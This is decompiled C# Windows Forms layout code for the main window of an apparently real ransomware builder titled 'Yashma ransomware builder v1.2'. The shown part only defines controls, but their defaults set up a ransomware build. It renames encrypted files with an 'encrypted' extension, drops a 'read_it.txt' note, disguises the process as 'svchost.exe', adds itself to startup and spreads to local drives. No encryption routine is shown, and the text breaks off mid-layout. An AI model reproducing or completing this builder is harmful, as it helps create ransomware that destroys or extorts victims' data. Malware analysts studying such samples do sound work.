namespace CustomWindowsForm
{
	// Token: 0x02000003 RID: 3
	public partial class BlackForm : global::System.Windows.Forms.Form
	{
		// Token: 0x06000065 RID: 101 RVA: 0x00005398 File Offset: 0x00003598
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000066 RID: 102 RVA: 0x000053D0 File Offset: 0x000035D0
		private void InitializeComponent()
		{
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::CustomWindowsForm.BlackForm));
			this.RightPanel = new global::System.Windows.Forms.Panel();
			this.TopPanel = new global::System.Windows.Forms.Panel();
			this._MinButton = new global::CustomWindowsForm.ButtonZ();
			this._MaxButton = new global::CustomWindowsForm.MinMaxButton();
			this.WindowTextLabel = new global::System.Windows.Forms.Label();
			this._CloseButton = new global::CustomWindowsForm.ButtonZ();
			this.RightBottomPanel_1 = new global::System.Windows.Forms.Panel();
			this.panel2 = new global::System.Windows.Forms.Panel();
			this.shapedButton2 = new global::CustomWindowsForm.ShapedButton();
			this.label1 = new global::System.Windows.Forms.Label();
			this.droppedMessageTextbox = new global::System.Windows.Forms.TextBox();
			this.shapedButton1 = new global::CustomWindowsForm.ShapedButton();
			this.sleepCheckBox = new global::System.Windows.Forms.CheckBox();
			this.SleepTextBox = new global::System.Windows.Forms.TextBox();
			this.selectIconLabel = new global::System.Windows.Forms.Label();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.startupcheckBox3 = new global::System.Windows.Forms.CheckBox();
			this.textBox4 = new global::System.Windows.Forms.TextBox();
			this.checkBox2 = new global::System.Windows.Forms.CheckBox();
			this.spreadNameText = new global::System.Windows.Forms.TextBox();
			this.checkBox1 = new global::System.Windows.Forms.CheckBox();
			this.textBox2 = new global::System.Windows.Forms.TextBox();
			this.usbSpreadCheckBox = new global::System.Windows.Forms.CheckBox();
			this.shapedButton4 = new global::CustomWindowsForm.ShapedButton();
			this.shapedButton3 = new global::CustomWindowsForm.ShapedButton();
			this.RightBottomPanel_2 = new global::System.Windows.Forms.Panel();
			this.LeftBottomPanel_2 = new global::System.Windows.Forms.Panel();
			this.RightTopPanel_1 = new global::System.Windows.Forms.Panel();
			this.RightTopPanel_2 = new global::System.Windows.Forms.Panel();
			this.textBox1 = new global::System.Windows.Forms.TextBox();
			this.saveFileDialog1 = new global::System.Windows.Forms.SaveFileDialog();
			this.openFileDialog1 = new global::System.Windows.Forms.OpenFileDialog();
			this.TopPanel.SuspendLayout();
			this.panel2.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			base.SuspendLayout();
			this.RightPanel.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right);
			this.RightPanel.BackColor = global::System.Drawing.Color.Black;
			this.RightPanel.Cursor = global::System.Windows.Forms.Cursors.SizeWE;
			this.RightPanel.Location = new global::System.Drawing.Point(896, 22);
			this.RightPanel.Name = "RightPanel";
			this.RightPanel.Size = new global::System.Drawing.Size(2, 468);
			this.RightPanel.TabIndex = 1;
			this.RightPanel.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.RightPanel_MouseDown);
			this.RightPanel.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.RightPanel_MouseMove);
			this.RightPanel.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.RightPanel_MouseUp);
			this.TopPanel.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
			this.TopPanel.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.TopPanel.Controls.Add(this._MinButton);
			this.TopPanel.Controls.Add(this._MaxButton);
			this.TopPanel.Controls.Add(this.WindowTextLabel);
			this.TopPanel.Controls.Add(this._CloseButton);
			this.TopPanel.Location = new global::System.Drawing.Point(0, 0);
			this.TopPanel.Name = "TopPanel";
			this.TopPanel.Size = new global::System.Drawing.Size(845, 74);
			this.TopPanel.TabIndex = 4;
			this.TopPanel.Paint += new global::System.Windows.Forms.PaintEventHandler(this.TopPanel_Paint);
			this.TopPanel.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.TopPanel_MouseDown);
			this.TopPanel.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.TopPanel_MouseMove);
			this.TopPanel.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.TopPanel_MouseUp);
			this._MinButton.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this._MinButton.BZBackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this._MinButton.DisplayText = "_";
			this._MinButton.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this._MinButton.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 20.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this._MinButton.ForeColor = global::System.Drawing.Color.White;
			this._MinButton.Location = new global::System.Drawing.Point(737, 8);
			this._MinButton.MouseClickColor1 = global::System.Drawing.Color.FromArgb(60, 60, 160);
			this._MinButton.MouseHoverColor = global::System.Drawing.Color.FromArgb(50, 50, 50);
			this._MinButton.Name = "_MinButton";
			this._MinButton.Size = new global::System.Drawing.Size(31, 24);
			this._MinButton.TabIndex = 4;
			this._MinButton.Text = "_";
			this._MinButton.TextLocation_X = 6;
			this._MinButton.TextLocation_Y = -20;
			this._MinButton.UseVisualStyleBackColor = true;
			this._MinButton.Click += new global::System.EventHandler(this._MinButton_Click);
			this._MaxButton.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this._MaxButton.BZBackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this._MaxButton.CFormState = global::CustomWindowsForm.MinMaxButton.CustomFormState.Normal;
			this._MaxButton.DisplayText = "_";
			this._MaxButton.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this._MaxButton.ForeColor = global::System.Drawing.Color.White;
			this._MaxButton.Location = new global::System.Drawing.Point(774, 9);
			this._MaxButton.MouseClickColor1 = global::System.Drawing.Color.FromArgb(60, 60, 160);
			this._MaxButton.MouseHoverColor = global::System.Drawing.Color.FromArgb(50, 50, 50);
			this._MaxButton.Name = "_MaxButton";
			this._MaxButton.Size = new global::System.Drawing.Size(31, 24);
			this._MaxButton.TabIndex = 2;
			this._MaxButton.Text = "minMaxButton1";
			this._MaxButton.TextLocation_X = 8;
			this._MaxButton.TextLocation_Y = 6;
			this._MaxButton.UseVisualStyleBackColor = true;
			this._MaxButton.Click += new global::System.EventHandler(this._MaxButton_Click);
			this.WindowTextLabel.AutoSize = true;
			this.WindowTextLabel.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 26.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.WindowTextLabel.ForeColor = global::System.Drawing.Color.White;
			this.WindowTextLabel.Location = new global::System.Drawing.Point(8, 22);
			this.WindowTextLabel.Name = "WindowTextLabel";
			this.WindowTextLabel.Size = new global::System.Drawing.Size(534, 39);
			this.WindowTextLabel.TabIndex = 1;
			this.WindowTextLabel.Text = "Yashma ransomware builder v1.2";
			this.WindowTextLabel.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.WindowTextLabel_MouseDown);
			this.WindowTextLabel.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.WindowTextLabel_MouseMove);
			this.WindowTextLabel.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.WindowTextLabel_MouseUp);
			this._CloseButton.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this._CloseButton.BZBackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this._CloseButton.DisplayText = "X";
			this._CloseButton.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this._CloseButton.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this._CloseButton.ForeColor = global::System.Drawing.Color.White;
			this._CloseButton.Location = new global::System.Drawing.Point(811, 8);
			this._CloseButton.MouseClickColor1 = global::System.Drawing.Color.FromArgb(60, 60, 160);
			this._CloseButton.MouseHoverColor = global::System.Drawing.Color.FromArgb(50, 50, 50);
			this._CloseButton.Name = "_CloseButton";
			this._CloseButton.Size = new global::System.Drawing.Size(31, 24);
			this._CloseButton.TabIndex = 0;
			this._CloseButton.Text = "X";
			this._CloseButton.TextLocation_X = 6;
			this._CloseButton.TextLocation_Y = 1;
			this._CloseButton.UseVisualStyleBackColor = true;
			this._CloseButton.Click += new global::System.EventHandler(this._CloseButton_Click);
			this.RightBottomPanel_1.Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right);
			this.RightBottomPanel_1.BackColor = global::System.Drawing.Color.Black;
			this.RightBottomPanel_1.Cursor = global::System.Windows.Forms.Cursors.SizeNWSE;
			this.RightBottomPanel_1.Location = new global::System.Drawing.Point(878, 509);
			this.RightBottomPanel_1.Name = "RightBottomPanel_1";
			this.RightBottomPanel_1.Size = new global::System.Drawing.Size(19, 2);
			this.RightBottomPanel_1.TabIndex = 5;
			this.RightBottomPanel_1.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.RightBottomPanel_1_MouseDown);
			this.RightBottomPanel_1.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.RightBottomPanel_1_MouseMove);
			this.RightBottomPanel_1.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.RightBottomPanel_1_MouseUp);
			this.panel2.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.panel2.Controls.Add(this.shapedButton2);
			this.panel2.Controls.Add(this.label1);
			this.panel2.Controls.Add(this.droppedMessageTextbox);
			this.panel2.Controls.Add(this.shapedButton1);
			this.panel2.Controls.Add(this.sleepCheckBox);
			this.panel2.Controls.Add(this.SleepTextBox);
			this.panel2.Controls.Add(this.selectIconLabel);
			this.panel2.Controls.Add(this.pictureBox1);
			this.panel2.Controls.Add(this.startupcheckBox3);
			this.panel2.Controls.Add(this.textBox4);
			this.panel2.Controls.Add(this.checkBox2);
			this.panel2.Controls.Add(this.spreadNameText);
			this.panel2.Controls.Add(this.checkBox1);
			this.panel2.Controls.Add(this.textBox2);
			this.panel2.Controls.Add(this.usbSpreadCheckBox);
			this.panel2.Controls.Add(this.shapedButton4);
			this.panel2.Controls.Add(this.shapedButton3);
			this.panel2.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.panel2.ForeColor = global::System.Drawing.SystemColors.Control;
			this.panel2.Location = new global::System.Drawing.Point(0, 398);
			this.panel2.Name = "panel2";
			this.panel2.Size = new global::System.Drawing.Size(847, 146);
			this.panel2.TabIndex = 8;
			this.panel2.Paint += new global::System.Windows.Forms.PaintEventHandler(this.panel2_Paint);
			this.shapedButton2.BackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton2.BorderColor = global::System.Drawing.Color.Transparent;
			this.shapedButton2.BorderWidth = 2;
			this.shapedButton2.ButtonShape = global::CustomWindowsForm.ShapedButton.ButtonsShapes.RoundRect;
			this.shapedButton2.ButtonText = "File Extensions";
			this.shapedButton2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.shapedButton2.EndColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.shapedButton2.FlatAppearance.BorderSize = 0;
			this.shapedButton2.FlatAppearance.MouseDownBackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton2.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton2.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.shapedButton2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.shapedButton2.ForeColor = global::System.Drawing.Color.White;
			this.shapedButton2.GradientAngle = 90;
			this.shapedButton2.Location = new global::System.Drawing.Point(0, 82);
			this.shapedButton2.MouseClickColor1 = global::System.Drawing.Color.Black;
			this.shapedButton2.MouseClickColor2 = global::System.Drawing.Color.Black;
			this.shapedButton2.MouseHoverColor1 = global::System.Drawing.Color.FromArgb(80, 80, 80);
			this.shapedButton2.MouseHoverColor2 = global::System.Drawing.Color.FromArgb(80, 80, 80);
			this.shapedButton2.Name = "shapedButton2";
			this.shapedButton2.ShowButtontext = true;
			this.shapedButton2.Size = new global::System.Drawing.Size(166, 55);
			this.shapedButton2.StartColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.shapedButton2.TabIndex = 27;
			this.shapedButton2.TextLocation_X = 33;
			this.shapedButton2.TextLocation_Y = 19;
			this.shapedButton2.Transparent1 = 250;
			this.shapedButton2.Transparent2 = 250;
			this.shapedButton2.UseVisualStyleBackColor = false;
			this.shapedButton2.Click += new global::System.EventHandler(this.shapedButton2_Click);
			this.label1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.Location = new global::System.Drawing.Point(522, 17);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(115, 15);
			this.label1.TabIndex = 26;
			this.label1.Text = "Dropped File Name";
			this.droppedMessageTextbox.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.droppedMessageTextbox.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.droppedMessageTextbox.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.droppedMessageTextbox.ForeColor = global::System.Drawing.SystemColors.Window;
			this.droppedMessageTextbox.Location = new global::System.Drawing.Point(525, 40);
			this.droppedMessageTextbox.Name = "droppedMessageTextbox";
			this.droppedMessageTextbox.Size = new global::System.Drawing.Size(143, 22);
			this.droppedMessageTextbox.TabIndex = 25;
			this.droppedMessageTextbox.Text = "read_it.txt";
			this.droppedMessageTextbox.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.shapedButton1.BackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton1.BorderColor = global::System.Drawing.Color.Transparent;
			this.shapedButton1.BorderWidth = 2;
			this.shapedButton1.ButtonShape = global::CustomWindowsForm.ShapedButton.ButtonsShapes.RoundRect;
			this.shapedButton1.ButtonText = "Decrypter & Options";
			this.shapedButton1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.shapedButton1.EndColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.shapedButton1.FlatAppearance.BorderSize = 0;
			this.shapedButton1.FlatAppearance.MouseDownBackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton1.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.shapedButton1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.shapedButton1.ForeColor = global::System.Drawing.Color.White;
			this.shapedButton1.GradientAngle = 80;
			this.shapedButton1.Location = new global::System.Drawing.Point(175, 82);
			this.shapedButton1.MouseClickColor1 = global::System.Drawing.Color.Black;
			this.shapedButton1.MouseClickColor2 = global::System.Drawing.Color.Black;
			this.shapedButton1.MouseHoverColor1 = global::System.Drawing.Color.FromArgb(80, 80, 80);
			this.shapedButton1.MouseHoverColor2 = global::System.Drawing.Color.FromArgb(80, 80, 80);
			this.shapedButton1.Name = "shapedButton1";
			this.shapedButton1.ShowButtontext = true;
			this.shapedButton1.Size = new global::System.Drawing.Size(166, 55);
			this.shapedButton1.StartColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.shapedButton1.TabIndex = 23;
			this.shapedButton1.TextLocation_X = 16;
			this.shapedButton1.TextLocation_Y = 20;
			this.shapedButton1.Transparent1 = 200;
			this.shapedButton1.Transparent2 = 200;
			this.shapedButton1.UseVisualStyleBackColor = false;
			this.shapedButton1.Click += new global::System.EventHandler(this.shapedButton1_Click);
			this.sleepCheckBox.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.sleepCheckBox.AutoSize = true;
			this.sleepCheckBox.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.sleepCheckBox.Location = new global::System.Drawing.Point(359, 81);
			this.sleepCheckBox.Name = "sleepCheckBox";
			this.sleepCheckBox.Size = new global::System.Drawing.Size(91, 17);
			this.sleepCheckBox.TabIndex = 22;
			this.sleepCheckBox.Text = "Delay second";
			this.sleepCheckBox.UseVisualStyleBackColor = true;
			this.sleepCheckBox.CheckedChanged += new global::System.EventHandler(this.checkBox3_CheckedChanged);
			this.SleepTextBox.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.SleepTextBox.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.SleepTextBox.Enabled = false;
			this.SleepTextBox.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.SleepTextBox.ForeColor = global::System.Drawing.SystemColors.Window;
			this.SleepTextBox.Location = new global::System.Drawing.Point(359, 107);
			this.SleepTextBox.Name = "SleepTextBox";
			this.SleepTextBox.Size = new global::System.Drawing.Size(91, 22);
			this.SleepTextBox.TabIndex = 21;
			this.SleepTextBox.Text = "10";
			this.SleepTextBox.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.SleepTextBox.KeyPress += new global::System.Windows.Forms.KeyPressEventHandler(this.SleepTextBox_KeyPress_1);
			this.selectIconLabel.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.selectIconLabel.AutoSize = true;
			this.selectIconLabel.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.selectIconLabel.Location = new global::System.Drawing.Point(593, 93);
			this.selectIconLabel.Name = "selectIconLabel";
			this.selectIconLabel.Size = new global::System.Drawing.Size(61, 13);
			this.selectIconLabel.TabIndex = 20;
			this.selectIconLabel.Text = "Select Icon";
			this.selectIconLabel.Click += new global::System.EventHandler(this.selectIconLabel_Click);
			this.pictureBox1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.pictureBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.pictureBox1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.pictureBox1.Location = new global::System.Drawing.Point(579, 68);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(89, 69);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.CenterImage;
			this.pictureBox1.TabIndex = 18;
			this.pictureBox1.TabStop = false;
			this.pictureBox1.Click += new global::System.EventHandler(this.pictureBox1_Click);
			this.startupcheckBox3.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.startupcheckBox3.AutoSize = true;
			this.startupcheckBox3.Checked = true;
			this.startupcheckBox3.CheckState = global::System.Windows.Forms.CheckState.Checked;
			this.startupcheckBox3.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.startupcheckBox3.Location = new global::System.Drawing.Point(470, 82);
			this.startupcheckBox3.Name = "startupcheckBox3";
			this.startupcheckBox3.Size = new global::System.Drawing.Size(92, 17);
			this.startupcheckBox3.TabIndex = 15;
			this.startupcheckBox3.Text = "Add to startup";
			this.startupcheckBox3.UseVisualStyleBackColor = true;
			this.textBox4.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.textBox4.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.textBox4.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.textBox4.ForeColor = global::System.Drawing.SystemColors.Window;
			this.textBox4.Location = new global::System.Drawing.Point(359, 40);
			this.textBox4.Name = "textBox4";
			this.textBox4.Size = new global::System.Drawing.Size(143, 22);
			this.textBox4.TabIndex = 14;
			this.textBox4.Text = "svchost.exe";
			this.textBox4.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.checkBox2.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.checkBox2.AutoSize = true;
			this.checkBox2.Checked = true;
			this.checkBox2.CheckState = global::System.Windows.Forms.CheckState.Checked;
			this.checkBox2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.checkBox2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.checkBox2.Location = new global::System.Drawing.Point(359, 17);
			this.checkBox2.Name = "checkBox2";
			this.checkBox2.Size = new global::System.Drawing.Size(104, 17);
			this.checkBox2.TabIndex = 13;
			this.checkBox2.Text = "Proccess Name:";
			this.checkBox2.UseVisualStyleBackColor = true;
			this.checkBox2.CheckedChanged += new global::System.EventHandler(this.checkBox2_CheckedChanged);
			this.spreadNameText.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.spreadNameText.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.spreadNameText.ForeColor = global::System.Drawing.SystemColors.Window;
			this.spreadNameText.Location = new global::System.Drawing.Point(190, 40);
			this.spreadNameText.Name = "spreadNameText";
			this.spreadNameText.Size = new global::System.Drawing.Size(143, 22);
			this.spreadNameText.TabIndex = 12;
			this.spreadNameText.Text = "surprise";
			this.spreadNameText.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.checkBox1.AutoSize = true;
			this.checkBox1.Checked = true;
			this.checkBox1.CheckState = global::System.Windows.Forms.CheckState.Checked;
			this.checkBox1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.checkBox1.Location = new global::System.Drawing.Point(20, 14);
			this.checkBox1.Name = "checkBox1";
			this.checkBox1.Size = new global::System.Drawing.Size(146, 17);
			this.checkBox1.TabIndex = 11;
			this.checkBox1.Text = "Randomize file extension:";
			this.checkBox1.UseVisualStyleBackColor = true;
			this.checkBox1.CheckedChanged += new global::System.EventHandler(this.checkBox1_CheckedChanged);
			this.textBox2.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.textBox2.Enabled = false;
			this.textBox2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.textBox2.ForeColor = global::System.Drawing.SystemColors.Window;
			this.textBox2.Location = new global::System.Drawing.Point(20, 40);
			this.textBox2.Name = "textBox2";
			this.textBox2.Size = new global::System.Drawing.Size(143, 22);
			this.textBox2.TabIndex = 10;
			this.textBox2.Text = "encrypted";
			this.textBox2.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.usbSpreadCheckBox.AutoSize = true;
			this.usbSpreadCheckBox.Checked = true;
			this.usbSpreadCheckBox.CheckState = global::System.Windows.Forms.CheckState.Checked;
			this.usbSpreadCheckBox.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.usbSpreadCheckBox.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.usbSpreadCheckBox.Location = new global::System.Drawing.Point(193, 14);
			this.usbSpreadCheckBox.Name = "usbSpreadCheckBox";
			this.usbSpreadCheckBox.Size = new global::System.Drawing.Size(122, 17);
			this.usbSpreadCheckBox.TabIndex = 9;
			this.usbSpreadCheckBox.Text = "Spread Local Drives";
			this.usbSpreadCheckBox.UseVisualStyleBackColor = true;
			this.usbSpreadCheckBox.CheckedChanged += new global::System.EventHandler(this.usbSpreadCheckBox_CheckedChanged);
			this.shapedButton4.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.shapedButton4.BackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton4.BorderColor = global::System.Drawing.Color.Transparent;
			this.shapedButton4.BorderWidth = 2;
			this.shapedButton4.ButtonShape = global::CustomWindowsForm.ShapedButton.ButtonsShapes.RoundRect;
			this.shapedButton4.ButtonText = "Build ";
			this.shapedButton4.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.shapedButton4.EndColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.shapedButton4.FlatAppearance.BorderSize = 0;
			this.shapedButton4.FlatAppearance.MouseDownBackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton4.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton4.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.shapedButton4.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.shapedButton4.ForeColor = global::System.Drawing.Color.White;
			this.shapedButton4.GradientAngle = 90;
			this.shapedButton4.Location = new global::System.Drawing.Point(699, 79);
			this.shapedButton4.MouseClickColor1 = global::System.Drawing.Color.Black;
			this.shapedButton4.MouseClickColor2 = global::System.Drawing.Color.Black;
			this.shapedButton4.MouseHoverColor1 = global::System.Drawing.Color.FromArgb(80, 80, 80);
			this.shapedButton4.MouseHoverColor2 = global::System.Drawing.Color.FromArgb(80, 80, 80);
			this.shapedButton4.Name = "shapedButton4";
			this.shapedButton4.ShowButtontext = true;
			this.shapedButton4.Size = new global::System.Drawing.Size(136, 55);
			this.shapedButton4.StartColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.shapedButton4.TabIndex = 8;
			this.shapedButton4.TextLocation_X = 46;
			this.shapedButton4.TextLocation_Y = 18;
			this.shapedButton4.Transparent1 = 250;
			this.shapedButton4.Transparent2 = 250;
			this.shapedButton4.UseVisualStyleBackColor = false;
			this.shapedButton4.Click += new global::System.EventHandler(this.shapedButton4_Click);
			this.shapedButton3.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.shapedButton3.BackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton3.BorderColor = global::System.Drawing.Color.Transparent;
			this.shapedButton3.BorderWidth = 2;
			this.shapedButton3.ButtonShape = global::CustomWindowsForm.ShapedButton.ButtonsShapes.RoundRect;
			this.shapedButton3.ButtonText = "About";
			this.shapedButton3.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.shapedButton3.EndColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.shapedButton3.FlatAppearance.BorderSize = 0;
			this.shapedButton3.FlatAppearance.MouseDownBackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton3.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Transparent;
			this.shapedButton3.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.shapedButton3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.shapedButton3.ForeColor = global::System.Drawing.Color.White;
			this.shapedButton3.GradientAngle = 90;
			this.shapedButton3.Location = new global::System.Drawing.Point(699, 18);
			this.shapedButton3.MouseClickColor1 = global::System.Drawing.Color.Black;
			this.shapedButton3.MouseClickColor2 = global::System.Drawing.Color.Black;
			this.shapedButton3.MouseHoverColor1 = global::System.Drawing.Color.FromArgb(80, 80, 80);
			this.shapedButton3.MouseHoverColor2 = global::System.Drawing.Color.FromArgb(80, 80, 80);
			this.shapedButton3.Name = "shapedButton3";
			this.shapedButton3.ShowButtontext = true;
			this.shapedButton3.Size = new global::System.Drawing.Size(136, 55);
			this.shapedButton3.StartColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.shapedButton3.TabIndex = 7;
			this.shapedButton3.TextLocation_X = 45;
			this.shapedButton3.TextLocation_Y = 18;
			this.shapedButton3.Transparent1 = 250;
			this.shapedButton3.Transparent2 = 250;
			this.shapedButton3.UseVisualStyleBackColor = false;
			this.shapedButton3.Click += new global::System.EventHandler(this.shapedButton3_Click);
			this.RightBottomPanel_2.Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right);
			this.RightBottomPanel_2.BackColor = global::System.Drawing.Color.Black;
			this.RightBottomPanel_2.Cursor = global::System.Windows.Forms.Cursors.SizeNWSE;
			this.RightBottomPanel_2.Location = new global::System.Drawing.Point(896, 490);
			this.RightBottomPanel_2.Name = "RightBottomPanel_2";
			this.RightBottomPanel_2.Size = new global::System.Drawing.Size(2, 19);
			this.RightBottomPanel_2.TabIndex = 9;
			this.RightBottomPanel_2.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.RightBottomPanel_2_MouseDown);
